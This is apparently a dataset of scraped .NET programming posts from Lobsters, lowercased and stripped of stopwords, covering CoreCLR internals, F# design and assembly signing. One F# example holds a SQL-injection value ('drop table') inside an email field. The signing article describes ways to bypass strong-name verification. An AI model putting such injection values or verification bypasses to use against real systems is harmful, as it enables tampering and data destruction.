initiated client server page rendering work serverside clientside page updated automatically state change complete action history saved azure storage tableif start home page navigate counter page increment counter see counter page rendered clientside viewsource show incorrect count refresh counter page see page rerendered serverside see correct current count html sourcedeleting session cookie refreshing page generate new session resetting counter initial value zero worry start timer leave grain behind orleans let grain run time deactivates automatically receive input anymore want grain persistently reactivate use orleans reminderlimitationsthe limitation orleansbased architecture ran provides builtin way searching data interactive analysis data modelling actor smart way often avoid need index sometimes need search big pile static data loading memory actor object feasible efficiently implemented index used elastic search azure search addition orleans project fill gap instance provide faceted search navigation feature need powerful reporting powerbi another good addition orleansat microsoft research orleans developed apparently ran limitation smart people working builtin actor indexing tell code released sometime soon like support distributed transactional actor limitation encounter yet even limitation may go away eventuallyother solutionsthere several solution make reactivity realtime processing server possible meteor firebase rethinkdb wellknown technology bring realtime data application usually websockets offer way subscribing update happen backend let connect event business logici prefer actor based approach think simpler easily scalable actor everything us programming language notificationsubscribe logic actor make anything want api fancy infrastructure bottleneck update must pas
417,Lobsters,dotnet,"C#, F#, .NET programming",The .NET IL Interpreter,http://www.mattwarren.org/2017/03/30/The-.NET-IL-Interpreter/,net il interpreter,net il interpreter previous blog post usage scenario initial bring featureinterpreter enable interpreter linux well tiered compilation step interpreter volatile ldobj appears incorrect semantics alexrp comment code raw assembly enabling interpreter build coreclr source fallback host configuration knob interpret interpreterdoloopmethods interpreterprintpostmortem dumpinterpreterstubs traceinterpreterentries traceinterpreteril traceinterpreterverbose traceinterpreterjittransition diagnostic output main section interpreter code toplevel dispatcher giant switch statement intermediate language il opcodes method call dynamically generating stub creating object array boxing unboxing loading storing data specific il op code interpreter compareopres interpreter compareop interpreter broncomparison void interpreter binaryarithop void interpreter binaryarithovfop working garbage collector gc interpreter gcscanroots interpreter gcscanrootatloc integration virtual machine vm hackernews rprogramming,net il interpreter mar word whilst writing previous blog post stumbled across net interpreter tucked away source code although made even smallest amount effort look easily found via github magic file search usage scenario look use worth pointing interpreter really meant production code far tell main purpose allow get clr running new cpu architecture without interpreter able test c code fully functioning jit could emit machine code instance see initial bring featureinterpreter enable interpreter linux well also key feature notable debugging support debug c code interpreted although course debug interpreter tiered compilation step interpreter good enough shape run production code asis also significant issue want debugging profiling tool work see example interpreter volatile ldobj appears incorrect semantics thanks alexrp telling issue also fair amount todo comment code although verified specific c code break due missing functionality however think another really useful scenario interpreter help learn inner working clr line long one file significantly written c code clrjit us compiling real multiple several file jit loc spread across file large amount handwritten written raw assembly theory interpreter work way full runtime albeit optimised mean much simpler u clr andor assembly expert chance working going enabling interpreter interpreter disabled default build coreclr source make work used fallback longer case diff change need make asrcincswitchesh bsrcincswitchesh define featurestacksampling endif defined allowsxsjit let test net interpreter define featureinterpreter endif defined crossgencompile also need enable environment variable one used table full list take look host configuration knob search interpreter name description interpret selectively us interpreter execute specified method interpreterdoloopmethods set check loop start interpreting method interpreterprintpostmortem print summary information execution console dumpinterpreterstubs print interpreter stub created console traceinterpreterentries log entry interpreted method console traceinterpreteril log individual instruction interpreted method console traceinterpreterverbose log interpreter progress detailed message console traceinterpreterjittransition log interpreter determines method jitted test interpreter using code public static void main string args var max argslength inttryparse args max var timer stopwatchstartnew int max consolewriteline stringformat completed iteration timerstop consolewriteline stringformat performed iteration max consolewriteline stringformat took msec timerelapsedmilliseconds consolewriteline machine give following result iteration run compiled msec interpreted msec yeah want using interpreter performance sensitive code diagnostic output addition diagnostic output produced note single iteration loop otherwise becomes verbose read generating interpretation stub hash consoleapplicationprogram main skipping consoleapplicationprogram cctor entering method consoleapplicationprogram main class argument class systemstring start consoleapplicationprogram main class nop call skipping consoleapplicationstopwatch cctor skipping domainboundilstubclass ilstubpinvoke skipping consoleapplicationstopwatch startnew skipping consoleapplicationstopwatch ctor skipping consoleapplicationstopwatch reset skipping consoleapplicationstopwatch start skipping consoleapplicationstopwatch gettimestamp returning method consoleapplicationprogram main class stub num class consoleapplicationstopwatch int bool false class consoleapplicationstopwatch int bool false br clt class consoleapplicationstopwatch int bool true brtrues nop ldstr box call returning method consoleapplicationprogram main class stub num call completed iteration returning method consoleapplicationprogram main class stub num nop nop add class consoleapplicationstopwatch int bool true clt class consoleapplicationstopwatch int bool false brtrues callvirt skipping consoleapplicationstopwatch stop returning method consoleapplicationprogram main class stub num nop ldstr callvirt skipping consoleapplicationstopwatch getelapsedmilliseconds skipping consoleapplicationstopwatch getelapseddatetimeticks skipping consoleapplicationstopwatch getrawelapsedticks returning method consoleapplicationprogram main class stub num box call returning method consoleapplicationprogram main class stub num call took msec returning method consoleapplicationprogram main class stub num nop ret clearly see interpreter action executing individual il instruction showing current value local variable go along entire program run also get nice summary statistic time fullrun iteration il instruction profiling instruction total instruction exec cum ceq nop brtrues cgt rem add call ldstr box callvirt br ret main section interpreter code seen action let take look code within interpreter see work toplevel dispatcher heart interpreter giant switch statement interpreter executemethod almost line long find lot code like switch milcodeptr case ceenop milcodeptr continue case ceebreak todo interact debugger milcodeptr continue case ldarg break case ldarg break total case statement corresponding available clr intermediate language il opcodes different combination instance ceeldc ie large majority case statement call another function actual work although exception ceeret method call task take lot code interpreter handling method call loc total spread across several method particular part work summary work involves dynamically generating stub ensuring method argument right register hence assembly code handle virtual method static instance call delegate intrinsics probably scenario well addition method called need interpreted also make sure happens creating object array interpreter need handle key functionality runtime creating initialising object call gc finally calling constructor boxing unboxing another large chuck code dedicated boxingunboxing converting value type structs object reference needed net il provides specific opcodes handle loading storing data readingwriting field object element array specific il op code also significant amount code line deal lowlevel operation comparisions branching basic arithmetic interpreter compareopres ceq cgt cgtun clt cltun called via interpreter compareop beq bge bgt ble blt bneun bgeun bgtun bleun bltun called via interpreter broncomparison void interpreter binaryarithop void interpreter binaryarithovfop working garbage collector gc addition interpreter provide gc information need happens gc call interpreter gcscanroots additional work talking place interpreter gcscanrootatloc simply interpreter let gc know root object currently live includes static variable local variable function currently executing interpreter locates root object notifies gc via callback pf void interpreter gcscanrootatloc object loc interpretertype promotefunc pf scancontext sc bool pinningref switch ittocorinfotype case corinfotypeclass case corinfotypestring dword flag pinningref flag gccallpinned pf loc sc flag break integration virtual machine vm finally whilst interpreter fairly selfcontained time need work rest runtime discus post hackernews rprogramming
418,Lobsters,dotnet,"C#, F#, .NET programming",Visual Studio 2017 can automatically recommend NuGet packages for unknown types,https://www.hanselman.com/blog/VisualStudio2017CanAutomaticallyRecommendNuGetPackagesForUnknownTypes.aspx,visual studio automatically recommend nuget package unknown type,sponsor jetbrains rider new crossplatform net ide hosting,great feature visual studio visual studio turned default use meg memory make happy turn c advanced tool option type advanced quick launch bar via ctrlq like jump turn suggest using type nuget package suggest using type reference assembly example typing code start referencing type nt project could know sometimes need using statement bring namespace web app already jsonnet recommends using statement bring scope console app package beyond default start using type like jobject popular nuget visual studio offer install jsonnet another example immediately continue typing intellisense know bring something like without ever using mouse leaving line good stuff sponsor check jetbrains rider new crossplatform net ide edit refactor test build debug aspnet net framework net core unity application learn get access early build hosting
419,Lobsters,dotnet,"C#, F#, .NET programming",Learning Haskell with Mark Seemann (2016),http://dotnetrocks.com/?show=1304,learning haskell mark seemann,carl franklin app vnext net rock microsoft mvp kinect window regional director pwop studio kinecttools gesturepak music code devintersection ndc ndc london oredev devteach devreach franklin brother lifeboat nowhere john scofield chain reaction groove get way richard campbell aspnet wwwdotnetrockscom wwwrunasradiocom wwwhtboxorg wwwdevintersectioncom,carl franklin carl franklin executive vice president app vnext software development firm focused latest methodology technology carl year veteran software industry cohost founder net rock first widely listened podcast net developer microsoft mvp kinect window microsoft regional director senior executive pwop studio fullservice audio video productionpost production studio located southeastern connecticut awarded mvp kinect work gesture recognition namely kinecttools gesturepak kinecttools abstraction kinect sdk take detail work using kinect window application gesturepak let record edit recognize gesture window application free open source product carl also creator music code set long instrumental music piece designed get state flow keep music code praised widely developer keeping focused helping solve difficult problem carl leader net community since visual basic vb community early day wrote visual basic programmer journal authoring q column magazine well many feature article vbpj magazine authored two book john wiley son socket programming vb helped create first web site vb developer carl gary vb home page started net rock three year word podcast became popular developed taught handson training class vbnet aspnet via training company franklinsnet carl spoken regularly conference around world devintersection ndc ndc london oredev microsoft teched microsoft teched europe devteach devreach others addition work development field carl work music business composer recording engineer producer multiinstrumentalist vocalist band franklin brother produced two album lifeboat nowhere album get nothing five star review noted guitar virtuoso john scofield collaborated carl two song chain reaction groove get way richard campbell richard campbell started playing microcomputer age really never done anything else since time involved every level pc industry manufacturing sale development large scale infrastructure implementation witness participant bill gate vision pc every desktop year served consultant company many country including barnes noblecom dow chemical johnson johnson health care service reuters subaruisuzu u air force providing advice architecture scaling system mentoring development team long experience working large scale system made soughtafter consultant halycon year dotcom boom worked closely venture capital private equity firm providing architectural guidance due diligence microsoft regional director recognized microsoft valuable professional mvp area ofaspnet development richard first met carl franklin creator net rock wwwdotnetrockscom internet audio talkshow net developer richard guest show friendship carl quickly evolved partnership show early came onboard cohost started runas radio wwwrunasradiocom podcast professional cofounder strangeloop network acquired radware spent five year board director telerik acquired progress software richard founded humanitarian toolbox wwwhtboxorg organization designed let developer around world donate skill disaster relief organization building open source software humanitarian toolbox became c registered u charity working number different project united nation u center disease control red cross today richard consultant advisor number successful technology firm well coowner content planner devintersection wwwdevintersectioncom group conference
420,Lobsters,dotnet,"C#, F#, .NET programming",A Hitchhikers Guide to the CoreCLR Source Code,http://www.mattwarren.org/2017/03/23/Hitchhikers-Guide-to-the-CoreCLR-Source-Code/,hitchhiker guide coreclr source code,hitchhiker guide coreclr source code photo alan rourke coreclr github repository coreclr one corefx one documentation available book runtime botr overall stats source mscorlib note commit compared rotor rotor shared source cli note corefx github repository top list top largest file gccpp top longest method marshalinfo marshalinfo module pmodule void gcheap planphase int condemnedgennumber void cordbprocess dispatchrcevent void dbgtransportsession transportworker lpcstr exception gethrsymbolicname hresult hr bool disassemble imdinternalimport pimport byte ilheader bool debugger handleipcevent debuggeripcevent pevent void lazymachstate unwindlazystate lazymachstate void parsenativetype module pmodule void stublinkercpu emitarrayopstub const arrayopscript top file commits initial commit github highlevel overview note observation gist gist deep dive individual area src debugger garbage collector justintime compiler mscorlib platform adaptation layer virtual machine system namespace exist clr run corefx typeforwards code shared corert corert part mscorlib systemreflection systemreflectionemit systemglobalization systemthreading systemthreadingtasks systemruntimecompilerservices systemruntimeinteropservices systemdiagnostics systemtext systemcollections systemcollectionsgeneric systemio cpu architecturespecific code ceemaincpp thing clr executing single line code type system loading typesclasses threading exception handling stack walking fundamental type generic entire interpreter function calling mechanism botr stub virtual dispatch delegate event tracing profiler pinvoke reflection cpu architecturespecific code arm clarified one used want help advance state production codegenerators net contribute new ryujit backend long term direction mean use contribute bug fix necessary legacybackend path ryujit code base today unblock want make sure surprise hard feeling time come remove codebase jit phase phase ryuyjit phase ir transformation file preimport compilerhpp importation importercpp inlining inlinecpp inlinepolicycpp struct promotion morphcpp mark addressexposed local compilerhpp morph block morphcpp eliminate qmarks compilercpp flowgraph analysis flowgraphcpp normalize ir optimization compilercpp lclvarscpp ssa value numbering optimization livenesscpp loop invariant code hoisting optimizercpp copy propagation copypropcpp common subexpression elimination cse optcsecpp assertion propagation assertionpropcpp range analysis rangecheckcpp rationalization rationalizecpp lowering lowercpp lowerarmcpp lowerxarchcpp register allocation regalloccpp registerargconventioncp code generation codegenarmcpp codegencommoncpp codegenlegacycpp codegenlinearcpp codegenxarchcpp readwrite file percpu assembly code botr entry garbage collection design several blog post gccpp raw version gcenveecpp local gc gc sample gc sample local gc track progress data access component dac note dacaccess di cordbcpp ee inc rest binder mscorlib binder assembly application context fusion log classlibnative array systemobject string decimal float double systemenvironment coreclr corefx dlls gcdump gcinfo fully partially interruptible ilasm msdn page ildasm msdn page inc corjith corinfoh ipcman md reflection possible nativeresources palrt script strongname toolbox so sonofstrike superpmi tool unwinder walk unwind stack arm utilcode zap long thanks fish hacker news rprogramming,hitchhiker guide coreclr source code mar word photo alan rourke year ago microsoft opensourced entire net framework post attempt provide hitchhiker guide sourcecode found coreclr github repository make easier get information interested post split several part worth pointing net developer provided excellent glossary coreclr one corefx one come across unfamiliar term abbreviation check first also extensive documentation available interested lowlevel detail really recommend checking book runtime botr overall stats take look repository github show following stats entire repo c code test code look src ie ignore code test following mix source file type ie txt dat etc cpp h c inl hpp py asm idl c far majority code written c still also fair amount c code mscorlib clearly lowlevel part clr written c assembly code need close metal high performance interesting large part runtime written managed code note statslists post calculated using commit march compared rotor comparison stats rotor shared source cli looked like back october rotor shared source truly open source community involvement coreclr note sscli aka rotor includes fx base class library bcl coreclr hosted separately corefx github repository reference equivalent stats coreclr source march look like packaged mb zip archive million line code million source code src file source c source c c il assembler python perl million line test code build output expands g test product binary mb test binary mb top list list mostly fun give insight codebase structured top largest file might heard mammoth source file gccpp large github refuse display turn large file source also several file jit around loc however seems large file c source code interested c code worry top longest method large method actually hard find pragma warning keep compiler happy large method total top method line code marshalinfo marshalinfo module pmodule void gcheap planphase int condemnedgennumber void cordbprocess dispatchrcevent void dbgtransportsession transportworker lpcstr exception gethrsymbolicname hresult hr bool disassemble imdinternalimport pimport byte ilheader bool debugger handleipcevent debuggeripcevent pevent void lazymachstate unwindlazystate lazymachstate void parsenativetype module pmodule void stublinkercpu emitarrayopstub const arrayopscript top file commits finally let look file changed since initial commit github back january ignore merge commits highlevel overview next take look source code structured main component say picture worth thousand word treemap source code file grouped colour toplevel section fall hover individual box get detailed information click different radio button toggle sizing locfilescommits note observation commits represent commits made github year since coreclr opensourced skewed recent work represent change made entire history clr however interesting see component churn last year ie jit left alone eg pal number locfiles clear see significant component within coreclr source eg vm jit pal mscorlib covered detail next part post vm section interesting see much code generic loc much percpu architecture loc arm suggests code nicely organised perarchitecture work minimised cleanly separated surprising gc section small always thought gc complex component way code debugger pal likewise never really appreciated complexity jit largest component comprising loc interested raw number code src available gist code testssrc gist deep dive individual area source code well organised toplevel folder src correspond logical component within coreclr start looking significant component ie debugger garbage collector gc justintime compiler jit mscorlib c code platform adaptation layer pal clr virtual machine vm mscorlib folder contains c code within coreclr place c developer would start looking wanted contribute reason deserves treemap see structured byfar bulk code toplevel ie directly system namespace contains fundamental type exist clr run appdomain weakreference type array delegate object string boolean byte char etc tuple span arraysegment attribute datetime possible coreclr written c benefit managed code brings significant amount code within mscorlib section note anything externally exposed write c code run coreclr actually access everything corefx typeforwards coreclr appropriate know rule life coreclr v corefx based read various github issue seems time code moving coreclr corefx however managed c code often deeply entwined unmanaged c instance several type implemented across multiple file eg understand done performance reason code perf sensitive end implemented c even assembly unless jit suitable optimise c code code shared corert recently significant amount work done moved code shared partition area coreclr source code shared corert net core runtime optimized aot compilation certain class implemented runtimes ensured work duplicated fix shared location see work looking link part mscorlib section mscorlib line namespaces available net runtime contain functionality c devs used one time another largest one shown click go directly source code systemreflection systemreflectionemit fieldinfo propertyinfo methodinfo assemblybuilder typebuilder methodbuilder ilgenerator systemglobalization cultureinfo calendarinfo datetimeparse juliancalendar hebrewcalendar systemthreading systemthreadingtasks thread timer semaphore mutex asynclocal task task cancellationtoken systemruntimecompilerservices systemruntimeinteropservices unsafe callerfilepath callerlinenumber callermembername gchandle layoutkind marshalas structlayout layoutkind systemdiagnostics assert debugger stacktrace systemtext stringbuilder asciiencoding unicodeencoding systemcollections systemcollectionsgeneric systemio stream memorystream file testreader testwriter vm surprisingly largest component coreclr loc spread across file contains gut runtime bulk code o cpu independent written c however also significant amount architecturespecific assembly code see section cpu architecturespecific code info vm contains main startup routine entire runtime eestartuphelper ceemaincpp see thing clr executing single line code detail addition provides following functionality type system loading typesclasses threading exception handling stack walking fundamental type generic entire interpreter yes net run interpreted function calling mechanism see botr info stub used virtual dispatch delegate amongst thing event tracing profiler pinvoke reflection cpu architecturespecific code architecturespecific code kept separately several subfolders arm example various implementation writebarrier function used gc look actual source code worth looking different flavour jit available fortunately one microsoft developer clarified one used guidance nonms contributor think contributing jit want help advance state production codegenerators net contribute new ryujit backend long term direction instead interest around getting net core runtime working platform thing mean use contribute bug fix necessary legacybackend path ryujit code base today unblock run testing path today internal testing infrastructure best avoid regressing replace something better want make sure surprise hard feeling time come remove codebase jit phase jit almost source file fortunately correspond different phase go hard find way around using table phase ryuyjit added righthand column jump relevant source file phase ir transformation file preimport compiler lvatable created filled user argument variable basicblock list initialized compilerhpp importation gentree node created linked statement statement basicblocks inlining candidate identified importercpp inlining ir inlined method incorporated flowgraph inlinecpp inlinepolicycpp struct promotion new lvlvars created field promoted struct morphcpp mark addressexposed local lvlvars reference occurring addresstaken context marked must kept uptodate compilerhpp morph block performs localized transformation including mandatory normalization well simple optimization morphcpp eliminate qmarks gtqmark node eliminated simple one require control flow compilercpp flowgraph analysis basicblock predecessor computed must kept valid loop identified normalized cloned andor unrolled flowgraphcpp normalize ir optimization lvlvar reference count set must kept valid evaluation order gentree node gtnextgtprev determined must kept valid compilercpp lclvarscpp ssa value numbering optimization computes liveness bblivein bbliveout basicblocks dominators build ssa tracked lvlvars computes value number livenesscpp loop invariant code hoisting hoist expression loop optimizercpp copy propagation copy propagation based value number copypropcpp common subexpression elimination cse elimination redundant subexressions based value number optcsecpp assertion propagation utilizes value number propagate transform based property nonnullness assertionpropcpp range analysis eliminate array index range check based value number assertion rangecheckcpp rationalization flowgraph order change fgordertree fgorderlinear gtcomma gtasg gtaddr node transformed rationalizecpp lowering register requirement fully specified gtlsrainfo control flow explicit lowercpp lowerarmcpp lowerxarchcpp register allocation register assigned gtregnum andor gtrsvdregs number spill temp calculated regalloccpp registerargconventioncp code generation determines frame layout generates code basicblock generates prolog epilog code method emit eh gc debug info codegenarmcpp codegencommoncpp codegenlegacycpp codegenlinearcpp codegenxarchcpp pal provides o independent layer give access common lowlevel functionality net originally written run window apis look similar apis however nonwindows platform actually implemented using functionality available o example pal code readwrite file look like int main int argc char argv wchar src f wchar dest b r wchar dir p handle h unsigned int b palinitialize argc const char argv setcurrentdirectoryw dir setcurrentdirectoryw dir h createfilew src genericwrite fileshareread null createnew null writefile h testingn b false closehandle h copyfilew src dest false deletefilew src palterminate return pal contain percpu assembly code lowlevel functionality instance different implementation debugbreak function gc clearly complex piece code lying right heart clr information recommend reading botr entry garbage collection design interested also written several blog post looking functionality however source code pointofview gc pretty simple spread across cpp file bulk work gccpp raw version loc want get deeper gc code warning pretty dense good way start search occurrence various etw event fired gc move phase outlined botr post event listed fireetwgctriggered fireetwgcmarkwithtype fireetwbgcallocwaitbegin fireetwbgcallocwaitend fireetwbgcdrainmark fireetwbgcrevisit fireetwbgcoverflow fireetwpinplugatgctime gc work isolation also requires help execute engine ee done via gctoeeinterface implemented gcenveecpp local gc gc sample finally others way get gc code understand firstly gc sample let use full gc independent rest runtime show create type layout information format gc expects implement fast object allocator write barrier allocate object work gc handle loc also worth mentioning local gc project ongoing effort decouple gc rest runtime even dashboard track progress currently gc code intertwined runtime vicaversa local gc aiming break link providing set clear interface gctoosinterface gctoeeinterface help coreclr crossplatform effort making gc easier port new os clr managed runtime one significant component provides advanced debugging experience via visual studio windbg debugging experience complex going go detail however want learn recommend read data access component dac note source look like laid well several main subcomponents toplevel debug folder dacaccess provides data access component dac functionality outlined botr page linked dac abstraction layer internal structure runtime debugger us inspect objectsclasses di contains exposed apis entry point debugger implemented coreclrcreatecordbobject cordbcpp ee section debugger work execution engine ee thing like stackwalking inc interface h file debugger component implement rest well main component various toplevel folder source full list binder binder responsible loading assembly within net program except mscorlib binder elsewhere binder comprises lowlevel code control assembly application context allimportant fusion log diagnosing assembly loading classlibnative code native implementation many core data type coreclr eg array systemobject string decimal float double also includes native method exposed systemenvironment namespace eg environmentprocessorcount environmenttickcount environmentgetcommandlineargs environmentfailfast etc coreclr corefx dlls gcdump gcinfo code writeout gcinfo produced jit help gc job gcinfo includes information liveness variable within section code whether method fully partially interruptible enables ee suspend method gc working ilasm il intermediate language assembler tool converting il code net executable see msdn page info usage example ildasm tool disassembling net executable corresponding il source code see msdn page info usage example inc header file define interface subcomponents make coreclr example corjith cover communication execution engine ee jit ee jit corinfoh interface going way ie jit ee ipcman code enables interprocess communication ipc used net mostly legacy probably crossplatform md metadata md code provides ability gather information method class type assembly make reflection possible nativeresources simple tool responsible convertingextracting resource window resource file palrt pal platform adaptation layer runtime contains specific part pal layer script several python script autogenerating various file source eg etw event strongname toolbox contains standalone tool so sonofstrike clr debugging extension enables reporting net specific information using windbg superpmi enables testing jit without requiring full execution engine ee tool unwinder provides lowlevel functionality make possible debugger exception handling component walk unwind stack done via function getmodulebase getfunctionentry implemented cpu architecturespecific code see arm utilcode shared utility code used vm debugger jit zap read far long thanks fish youtube discus post hacker news rprogramming
421,Lobsters,dotnet,"C#, F#, .NET programming",Why OO Matters (in F#),https://eiriktsarpalis.wordpress.com/2017/03/20/why-oo-matters-in-f/,oo matter f,known criticism oop enabling abstraction solid functional class value parametric module expressive apis powerful type gadts possible typeshape abstracting module f design guideline representing illegal state oo purity conclusion f design guideline f map implementation nooo manifesto like,f functionalfirst programming language come substantial objectoriented feature set featurecomplete fact almost c class ported f code little substantial alteration however significant subset language seeing limited appreciation community suspect partly fuelled known criticism oop partly desire different c functionalfirst language replace class function also opinion oop f merely serf compatibility layer net really cover unfortunate scenario use library accepts interface enabling abstraction one important aspect maintaining nontrivial codebase controlling complexity complexity contained partitioning code logically standalone component whose implementation detail hidden behind appropriately designed abstraction excellent solid functional article vesa karvonen argues selecting correct abstraction hard problem functional programming silver bullet dealing resonates lot strongly encourage everyone read full article said vesa framing article standard ml support fullblown module system module abstracted using signature parameterized module using functors module predominant mean abstraction ml ecosystem haskell type class higherkinded type f module intentionally stripped complicated feature effectively functioning mere namespacing construct claim inherent limit expressed using f module function term enabling good abstraction luckily always make use next best thing f oo thesis article strategically admitting element oo f codebase significantly improves quality maintainability conclusively prove within confines single blog post try provide hint class value parametric module often case api exposed module must context aware typically f developer address adding extra parameter every function module myapi let dostuffwith let dostuffwith work well simple case scale nicely dependency increase would typically prompt developer group argument context record type myapicontext module myapi let ctx myapicontext dostuffwith let ctx myapicontext dostuffwith complicates implementation even definition site consumption site practice either end one context type per component one god context entire application even importantly approach often violates encapsulation concern pushing burden gathering dependency consumer api every single time consume api partial application also little address concern nontrivial context le experienced developer might prompted something even worse lift dependency module value module myapi let filereadalltext userseirikconnectionstringtxt let environmentgetenvironmentvariable let random next let arg dostuffwith arg let arg dosutffwith arg bad many reason make api reliant global state introduces unneeded sideeffects push app configuration concern deep inside gut codebase module value initialization compiles static constructor entire compilation unit exact moment execution largely unpredictable initialization error manifest typeinitializationexceptions difficult debug contrast situation elegance afforded plain old class type myparametricapi member dostuffwith member dostuffwith api object could created application initialization many time required depending context also amenable testing add approach essentially functional approach since merely composing dependency expose contextsensitive api importantly achieves much simpler way definition site consumption site pay great dividend realized big codebases expressive apis important attribute methodbased apis allow greater expressive power two important way namedoptional parameter unlike ocaml whose function support outoforder named argument passing omitted optional argument f function support neither luckily using f method find immensely powerful tool exposing nontrivially parameterizable functionality function explicitly accepts optional parameter acceptable method accepts optional argument work like charm method overloading function name like connect simply good enough exposed public api powerful type type system afforded net strictly powerful expressed using module function example interface type scheduler abstract run async encodes kind function expressed term proper f lambda combined subtyping possible effectively encode existential type rankn polymorphism even gadts possible minimal augmentation type system practice possible leverage additional power effectively fact f make easy define generic function literal using object expression also typeshape library made possible abstracting module function unit abstraction f unit often insufficient abstracting apis prompt developer adopt approach abstract apis surfaced either record tuples function type serializer serialize bool obj string deserialize bool string obj according f design guideline use record building apis discouraged recommends using regular interface instead strongly agree recommendation multitude reason interface powerful since support generic method named argument optional argument interface le likely defined term closure making easier reason viewing debugger example could rendered interface like type serializer abstract serialize preserverefeq bool value string abstract deserialize preserverefeq bool pickle string important aspect approach readability easier consumer interface anticipate purpose argument way easier understand record function tuple function representing illegal state lot proverbial ink spent describing strive make illegal state unrepresentable however fail see could fully realized given functional core f consists algebraic data type take example oftquoted email type type email email string following value valid instaces type email email null email john smith email eirik foobar drop table dbousers truly care illegal state obvious alteration type ought following type email private email string member thisaddress let email addr addr static member tryparse address string isvalidemail address email address else none really class encoded union implementation simpler type email private address string member address address static member tryparse address string isvalidemail address email address else none nb previous implementation might fact warranted case free structural equality comparison needed intent purpose approach effectively subscribe oostyle encapsulation oo purity relationship oo purity frequent avenue misconception occasionally someone claim admitting object ipso facto forsaking purity contrary claim really orthogonal concern lambda capable producing sideeffects object designed purity good example map set core library lambda really abstract class single virtual method lot syntactic sugar nothing fundamentally setting apart object exclude syntactic aspect conclusion call go fullblown oo f project digging old gof copy design pattern functional curriculum together profunctor optic inheritance class hierarchy sexy fact proposing third way functional oo component coexist one paradigm complementing hardly new idea quoting f design guideline f commonly called functionalfirst language object functional imperative paradigm well supported functional programming tends first technique used many default f set encourage functional programming programming paradigm effective efficient combination often best common misconception functional object programming methodology competing fact generally orthogonal largely complementary often functional programming play stronger role small eg implementation level functionsmethod code contained therein object programming playe bigger role large eg structural level class interface namespaces organization apis framework year working f style gradually shifted towards embracing approach example typically write implementation large component functional style behind private module expose public api part standalone class find methodbased apis friendlier consumer unfamiliar implementation use record union encoding internal representation class encapsulating publicly visible instance good example f map implementation rarely expose record union part public api unless abundantly evident possible instance given type valid context use happen often experience module exposed part public api care must taken number argument small behaviour predicted reading type signature function alone core list array module good example avoid using module expose complex functionality like async api remember reading year back simon cousin nooo manifesto stand objectoriented development retrospect find excellent name manifesto oo thing oo proposal revive manifesto perhaps understanding oo also implies fp context f like like loading
423,Lobsters,dotnet,"C#, F#, .NET programming",How to securely sign .NET assemblies,https://lowleveldesign.org/2017/03/07/how-to-securely-sign-dotnet-assemblies/,securely sign net assembly,testlib cultureneutral strong name signature public key token dnspy public key token strongnamesignercs dnlib snk file editor template keyfile delaysign article authenticode signature autheticode signature force integrity signature verification bypasstrustedappstrongnames runtime allowstrongnamebypass hklmsoftwaremicrosoftnetframework delay signed hklmsoftwaremicrosoftstrongnameverification sn vr sn signtool sigcheck summary signing assembly way prove code assembly legitimate tampered encourage use strong name signature authenticode like,testlib cultureneutral line mean anything probably net developer also probably know hex string end represents public key token sign assembly strong name signature know token calculated know structure strong name signature post go detail strong naming work shortcoming also look certificatebased signature end examine assembly verification process strong name signature public key token valid strong name signature ensures recipient assembly received tampered also uniquely identifies given assembly though say anything identity signer two part assembly binary code play role strong name verification process first part public key part blob stream assembly metadata screenshot show part dnspy window image list element build public key block public key token used uniquely reference assembly hex representation low byte hash public key reverse byte order test assembly equal second part rsa signature hash assembly content counting hash need fill zero following byte file authentication signature entry get moment strong name blob pe header checksum signature later stored pe file text section offset saved header calculate rsa signature need private key corresponding public key listed previous paragraph would like see c code implementing validation look strongnamesignercs file dnlib library examined strong name signature structure let focus tool may use create start generating snk file store rsa key detail interested detail snk file format look editor template snexe k testlibsnk keep generated snk file secret next depending scenario may use either c compiler cscexe assembly linker alexe accept keyfile parameter provide path generated snk file eg cscexe keyfile testlibsnk library testlibcs command generate signature based hash file content nowadays considered inadequate secure hashing highly recommended use digest sign assembly using hash first need extract public key part snk file snexe p testlibsnk testlibpubkeysnk delay private key signing strong name signature block zeroed strong name signed flag set cscexe alexe accept delaysign parameter purpose cscexe keyfile testlibpubkeysnk delaysign library testlibcs finally need resign assembly using private key sn ra testlibdll testlibsnk strong named assembly would like migrate signature look article authenticode signature autheticode signature name suggests used authenticate owner assembly also guard integrity assembly size location signature stored pe optional header force integrity flag also marked image used force loader always check signature given assembly window skip signature verification except driver module loaded protected process native code special linker option enable found option either cscexe alexe used dnspy set needed first delay signed assembly set flag resign create authenticode need posse certificate containing private key pfx format required test purpose selfsigned certificate work unless set force integrity flag release deployment obtain one trusted provider sample command sign assembly using certificate file might look follows signtool sign v ph fd f filesignaturepfx p certificatepassword http timestampverisigncomscriptstimstampdll testlibdll remember create strong name signature creating authenticode signature verification net starting version perform strong name signature validation assembly loaded fulltrust application domain basically mean fulltrust app domain may replace strong named assembly assembly containing public key one notice may change behavior either enabling bypasstrustedappstrongnames property runtime configuration file zeroing allowstrongnamebypass value hklmsoftwaremicrosoftnetframework key use apps system even setting place still way load partially signed assembly application app domain mechanism used working delay signed assembly development often want fully sign assembly build private key kept safe one place time want assembly behave strong name could achieved adding assembly name public key token registry key hklmsoftwaremicrosoftstrongnameverification example using sn command vr option system administrator allowed modify verification list come authenticode verification net performs force integrity flag set pe header fortunately need rely automatic verification perform verification tool used sign assembly provide u way validate check strong name signature may use sn f option force sn check signature even disabled registry adding key file argument optional recommended use authenticode example usage sn vf testlibdll testlibsnk authenticode verification may use either signtool sigcheck example call might look follows signtool verify testlibdll add pa using selfsigned root certificate sigcheck testlibdll show certificate chain used sign assembly sigcheck also recursively scan directory verify found binary encourage check help find interesting option like submitting binary hash virustotal summary given easy skip signature verification may doubt whole concept signing binary consider though verification loading important malicious person get write access binary signature protect hisher activity signing assembly way prove code assembly legitimate tampered encourage use strong name signature authenticode perform first verification client receives binary often done installers sure tampering transit happened next extremely important set valid access right folder binary reside authorized person allowed modify file finally whenever problem application ask client verify signature filling bug report way could sure bug really like like loading
